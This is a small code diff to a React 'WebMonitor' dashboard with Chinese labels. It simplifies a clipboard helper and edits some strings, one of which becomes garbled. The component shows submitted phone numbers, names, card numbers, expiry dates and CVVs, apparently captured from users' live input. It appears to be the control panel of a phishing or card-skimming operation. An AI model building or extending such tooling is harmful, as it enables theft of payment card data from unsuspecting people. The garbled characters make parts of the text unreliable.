@@ -195,29 +195,11 @@ export function WebMonitor() {
     setExpandedItems(newExpanded);
   };
 
-  const copyToClipboard = async (text: string, fieldType: string) => {
+  const copyToClipboard = async (text: string) => {
     try {
       await navigator.clipboard.writeText(text);
-      const fieldKey = `${Date.now()}-${fieldType}`;
-      setCopiedField(fieldKey);
-
-      toast({
-        title: "复制成功",
-        description: `已复制 ${fieldType}: ${text}`,
-        duration: 2000,
-      });
-
-      // 清除复制状态
-      setTimeout(() => {
-        setCopiedField(null);
-      }, 1000);
     } catch (err) {
-      toast({
-        title: "复制失败",
-        description: "无法复制到剪贴板",
-        variant: "destructive",
-        duration: 2000,
-      });
+      console.error('复制失败:', err);
     }
   };
 
@@ -314,7 +296,7 @@ export function WebMonitor() {
 
               {/* 中部：卡的类型、手机号、姓名、卡号、有效期、CVV */}
               {(() => {
-                // ��查是否有用户实际输入数据
+                // 检查是否有用户实际输入数据
                 const hasUserData = submission.realtimeInput && (
                   submission.realtimeInput.phone ||
                   submission.realtimeInput.cardNumber ||
@@ -464,7 +446,7 @@ export function WebMonitor() {
                   <h4 className="text-sm font-medium text-foreground mb-1">详细信息</h4>
                   <div className="grid grid-cols-4 gap-3 text-xs">
                     <div>
-                      <span className="text-muted-foreground">提交时间: </span>
+                      <span className="text-muted-foreground">提交��间: </span>
                       <span className="font-medium">{submission.timestamp}</span>
                     </div>
                     <div>
